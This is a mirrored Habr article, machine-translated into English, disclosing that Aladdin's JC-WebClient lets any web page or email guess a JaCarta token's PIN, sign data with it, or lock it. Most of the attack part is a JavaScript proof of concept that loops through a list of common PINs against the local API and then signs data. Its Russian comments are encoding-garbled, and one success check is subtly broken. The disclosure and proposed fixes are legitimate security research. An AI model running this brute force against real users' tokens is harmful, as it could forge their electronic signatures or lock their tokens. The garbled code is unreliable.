<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Test JaCarta WebClient or store tokens in a safe</title>
  <meta name="description" content="‚ÄúWhen black cover drifted aside for a moment, Margherita turned round and saw that there were not only multi-colored towers with an airplane unfolding...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="https://quick-geek.github.io/search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <section class="page js-page"><h1>Test JaCarta WebClient or store tokens in a safe</h1><div class="post__text post__text-html js-mediator-article"> <i>‚ÄúWhen black cover drifted aside for a moment, Margherita turned round and saw that there were not only multi-colored towers with an airplane unfolding above them, but the city itself had not left for a long time and had left only fog in itself.‚Äù</i> <i><br><br></i>  <i>M.A.</i>  <i>Bulgakov</i> <i><br></i>  <i>"The Master and Margarita"</i> <br><br>  Hi, Habr!  Probably almost every Russian organization has these products in a fun multicolored coloring.  We are talking about products JaCarta and software to them.  This happiness came to me too, and I decided to push the black cover a little to hide their essence, in other words API.  Some banks, especially issuing JaCarta GOST-2 tokens to their customers, require the installation of the JC-WebClient application from Aladdin RD to work. <br><br>  Although there is no fresh distribution on the official website of the developer (in the Demo section, you can download the older version, but it uses outdated API), the distribution can be found using Google on the line "JC-WebClient-4.0.0.1186" on the RBS sites. <br><br>  After installing the application on the user's computer, port 24738 opens on which this client is running. <br><br> <code>https://localhost:24738/JCWebClient.js</code> <br> <br>  The developer‚Äôs website describes the API of this application openly and in detail (as well as the file system functions of the entire line of tokens of this manufacturer via jcFS.dll, included in the ‚ÄúJaCarta Single Client‚Äù installation package) and the point is that with a number of functions you can or sign the EDS on the token with anything, pick up the pin code, or block the token with unsuccessful attempts to enter it.  And all this remotely, via the Internet. <br><a name="habracut"></a><br>  It‚Äôs no secret that users often leave the token with the pin code by default, or the one with which they received it (they are usually afraid that when changing the pin code, everything will stop working). <br><br>  The most commonly used pin codes are 123456, and the token during the working day, or even around the clock, is plugged into the computer port or usb hub. <br><br>  Thanks to JC-WebClient, if such a user is allowed to slip a webpage or a letter with uncomplicated JavaScript, then it becomes possible not to get the keys of the token (in some cases this is possible only by directly accessing the token file system, <a href="https://habr.com/post/276057/">an example has already been given here</a> ), but pick up the pin code and sign any data and send it somewhere. <br><br>  In case of 10 unsuccessful attempts to bust, the token is blocked, and how often it happens, if the pin of the administrator code for unlocking is not set, then only initialization will help.  And this is not the time paid taxes (and as a result of penalties and even blocking the settlement account of the tax organization), penalties from suppliers, in general, there is little good. <br><br><img src="https://habrastorage.org/webt/vr/wy/qe/vrwyqehr02krqg9muflt0rndgqa.jpeg"><br><br>  The problem with brute force of the pin code could be solved either by making it possible to enter it only through the JC-WebClient interface window, or as a half-measure, in the case of for example 3 unsuccessful input attempts, to block further authorization, display a message to the user, and wait until it confirm your actions. <br><br>  I wrote a small test script that shows this vulnerability.  The script works on all modern and relatively modern browsers, even IE :) <br><br>  Naturally, he does not send anything anywhere, but simply displays the results of the work of a sequence of functions. <br><br>  The script implements a full brute force of 10 attempts to enter the PIN code "for slaughter" the token, so you can run the script only with a test token! <br><br>  You should also remember that the use of this script otherwise than on your own test token is a violation of the law. <br><br>  Test result: <br><br><img src="https://habrastorage.org/webt/et/g1/ma/etg1ma5gplp9lsyedbytdzxtcx8.jpeg"><br>  Key generation and certificate generation script using JC-WebClient for testing. <br>  You can use EToken PRO Java 72 K, JaCarta GOST, JaCarta GOST-2.  The token must be pre-initialized with pin user code 111111. <br><br>  Before testing, you need to install JC-WebClient version not lower than 4. <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient –±—ã–ª —É—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω"+" "); //–ü–æ–ª—É—á–∞–µ–º –≤–µ—Ä—Å–∏—é JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write("–í–µ—Ä—Å–∏—è JCWebClient2 " + vers +" "); //–ü–æ–ª—É—á–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ —Å–ª–æ—Ç–∞–º –∏ –æ–ø—Ä–µ–¥–µ–ª—è–µ–º —á–∏—Å–ª–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ var slots = JCWebClient2.getAllSlots(); document.write("–ü–æ–¥–∫–ª—é—á–µ–Ω–æ —Ç–æ–∫–µ–Ω–æ–≤: "+slots.length+" "); //–í—ã–≤–æ–¥–∏–º –º–æ–¥–µ–ª—å —Ç–æ–∫–µ–Ω–æ–≤ for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write("–¢–æ–∫–µ–Ω: "+slot.device.name+" "+slot.device.model+" "); } var tokenID = slot.id, // –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Ç–æ–∫–µ–Ω–∞ userPin = '111111'; // PIN-–∫–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –Ω–∞ —Ç–æ–∫–µ–Ω–µ // (–¥–æ–ª–∂–Ω–æ —Ä–∞–≤–Ω—è—Ç—å—Å—è JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('1) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); // –ü—Ä–µ–¥—ä—è–≤–∏—Ç—å PIN-–∫–æ–¥ JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: userPin } }); // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∏–∑–º–µ–Ω–∏–≤—à–µ–µ—Å—è —Å–æ—Å—Ç–æ—è–Ω–∏–µ // (–¥–æ–ª–∂–Ω–æ —Ä–∞–≤–Ω—è—Ç—å—Å—è JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('2) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); // –°–æ–∑–¥–∞—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Å –∫–ª—é—á–µ–≤–æ–π –ø–∞—Ä–æ–π –∏ –ø—Ä–∏—Å–≤–æ–∏—Ç—å –µ–º—É –∏–º—è var keyPairID = JCWebClient2.createKeyPair({ args: { paramSet: "XA", description: "my description", algorithm: JCWebClient2.Vars.KeyAlgorithm.GOST_2012_256 } }); // –ó–∞–¥–∞—Ç—å –æ—Ç–ª–∏—á–∏—Ç–µ–ª—å–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (Distinguished Name (DN)), // –≤–∫–ª—é—á–∞—é—â–µ–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ –∏–º—è (Common Name, (CN)) var dn = { 'CN': '123', 'C': 'RU' }; // –ó–∞–¥–∞—Ç—å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è, –æ–ø—Ä–µ–¥–µ–ª—è—é—â–∏–µ –æ–±–ª–∞—Å—Ç—å –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è –∑–∞–∫—Ä—ã—Ç–æ–≥–æ –∫–ª—é—á–∞ var exts = { 'keyUsage': 'Digital Signature' }; // –ó–∞–ø–∏—Å–∞—Ç—å —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç var contID = JCWebClient2.generateUserSelfSignedCertificate({ args: { keyPairID: keyPairID, dn: dn, exts: exts, days: 365 } }); //–ú–∞—Å—Å–∏–≤ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –Ω–∞ —Ç–æ–∫–µ–Ω–∞—Ö var list=[]; //–ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤ list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); //–ü–æ–ª—É—á–∞–µ–º id –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–æ–∑–¥–∞–Ω–Ω–æ–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ var data = list[0]; var contID = data.id; document.write("ID –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞: "+data.id+" "); document.write("–û–ø–∏—Å–∞–Ω–∏–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞: "+data.description+" "); document.write("–ê–ª–≥–æ—Ä–∏—Ç–º –ø–æ–¥–ø–∏—Å–∏: "+data.algorithm+" "); // –û—Ç–º–µ–Ω–∏—Ç—å –≤–≤–æ–¥ PIN-–∫–æ–¥–∞ JCWebClient2.unbindToken();</span></span></code> </pre> <br>  And the security audit script itself: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient –±—ã–ª —É—Å–ø–µ—à–Ω–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω"+" "); //–ü–æ–ª—É—á–∞–µ–º –≤–µ—Ä—Å–∏—é JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write("–í–µ—Ä—Å–∏—è JCWebClient2 " + vers +" "); //–ü–æ–ª—É—á–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ —Å–ª–æ—Ç–∞–º –∏ –æ–ø—Ä–µ–¥–µ–ª—è–µ–º —á–∏—Å–ª–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ var slots = JCWebClient2.getAllSlots(); document.write("–ü–æ–¥–∫–ª—é—á–µ–Ω–æ —Ç–æ–∫–µ–Ω–æ–≤: "+slots.length+" "); //–í—ã–≤–æ–¥–∏–º –º–æ–¥–µ–ª—å —Ç–æ–∫–µ–Ω–æ–≤ for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write("–¢–æ–∫–µ–Ω: "+slot.device.name+" "+slot.device.model+" "); } // –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Ç–æ–∫–µ–Ω–∞ var tokenID = slot.id; // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –Ω–∞ —Ç–æ–∫–µ–Ω–µ // (–¥–æ–ª–∂–Ω–æ —Ä–∞–≤–Ω—è—Ç—å—Å—è JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //–ú–∞—Å—Å–∏–≤ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –Ω–∞ —Ç–æ–∫–µ–Ω–∞—Ö var list=[]; //–ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤ list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); //–ü–æ–ª—É—á–∞–µ–º id –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ var data = list[0]; var contID = data.id; document.write("ID –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞: "+data.id+" "); document.write("–û–ø–∏—Å–∞–Ω–∏–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞: "+data.description+" "); document.write("–ê–ª–≥–æ—Ä–∏—Ç–º –ø–æ–¥–ø–∏—Å–∏: "+data.algorithm+" "); // –î–∞–Ω–Ω—ã–µ –¥–ª—è –ø–æ–¥–ø–∏—Å–∏ (Hello World –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ Base64) var dataToSign = 'SGVsbG8sIFdvcmxkIQ=='; document.write("–î–∞–Ω–Ω—ã–µ –¥–ª—è –ø–æ–¥–ø–∏—Å–∏: "+dataToSign+" "); //–ú–∞—Å—Å–∏–≤ –ø–∏–Ω –∫–æ–¥–æ–≤ var pin=["1234567890", "123456", "1234567", "12345678", "123456789", "0987654321", "111111", "qwerty", "012345", "0123456", "01234567"]; //—Ñ—É–Ω–∫—Ü–∏—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ function bind(pass) { JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: pass } }); } var i=0; //–ü–µ—Ä–µ–±–æ—Ä –ø–∏–Ω –∫–æ–¥–æ–≤ –≤ —Ü–∏–∫–ª–µ //–û—Å—Ç–æ—Ä–æ–∂–Ω–æ! –ü—Ä–∏ 10 –Ω–µ–≤–µ—Ä–Ω—ã—Ö –ø–æ–ø—ã—Ç–∫–∞—Ö —Ç–æ–∫–µ–Ω –±–ª–æ–∫–∏—Ä—É–µ—Ç—Å—è!!!!!!!!!! while (i &lt; 10) { i++; try{ bind(pin[i]); tokenState = JCWebClient2.getLoggedInState(); //–ï—Å–ª–∏ –∞—Ç–∞–∫–∞ —É–¥–∞–ª–∞—Å—å, –≤—ã–≤–æ–¥–∏–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∏ –∑–∞–≤–µ—Ä—à–∞–µ–º —Ü–∏–∫–ª if(tokenState.state=1) { document.write("–£—Å–ø–µ—à–Ω–æ –ø–æ–¥–æ–±—Ä–∞–Ω –ø–∏–Ω –∫–æ–¥: "+pin[i]+" "); break; } } //–í—ã–≤–æ–¥ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –æ—à–∏–±–∫–µ catch(e){document.write(e+" ");} } // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∏–∑–º–µ–Ω–∏–≤—à–µ–µ—Å—è —Å–æ—Å—Ç–æ—è–Ω–∏–µ // (–¥–æ–ª–∂–Ω–æ —Ä–∞–≤–Ω—è—Ç—å—Å—è JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //–ü–æ–ª—É—á–∞–µ–º —Å–æ–¥–µ—Ä–∏–∂–∏–º–æ–µ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞ var CertificateBody=JCWebClient2.getCertificateBody({ args: { id: contID } }); document.write("CertificateBody: "+CertificateBody+" "); // –ü–æ–¥–ø–∏—Å–∞—Ç—å –¥–∞–Ω–Ω—ã–µ, –∏—Å–ø–æ–ª—å–∑—É—è –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –≤—ã–≤–µ—Å—Ç–∏ –ø–æ–¥–ø–∏—Å–∞–Ω–Ω–æ–µ –≤ Base64 var signedData = JCWebClient2.signBase64EncodedData({ args: { contID: contID, data: dataToSign, attachedSignature: true } }); document.write("–ü–æ–¥–ø–∏—Å–∞–Ω–æ —É—Å–ø–µ—à–Ω–æ. "); document.write("–ü–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: "+signedData+" "); //–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–ø–∏—Å–∏ var signature = signedData; var res = JCWebClient2.verifyBase64EncodedData({ args: { signature: signature } }); document.write("–†–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–¥–ø–∏—Å–∏: "+res+" "); // –û—Ç–º–µ–Ω–∏—Ç—å –≤–≤–æ–¥ PIN-–∫–æ–¥–∞ JCWebClient2.unbindToken();</span></span></code> </pre> <br>  ‚Üí <a href="https://developer.aladdin-rd.ru/jc-webclient/4.0.0/index.html">JC-WebClient API Information Source</a> </div><p>Source: <a href="https://habr.com/ru/post/439790/">https://habr.com/ru/post/439790/</a></p>
<section class="navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
</ul></nav>
</section>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52319614 = new Ya.Metrika({
                  id:52319614,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52319614" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>
</body>

</html>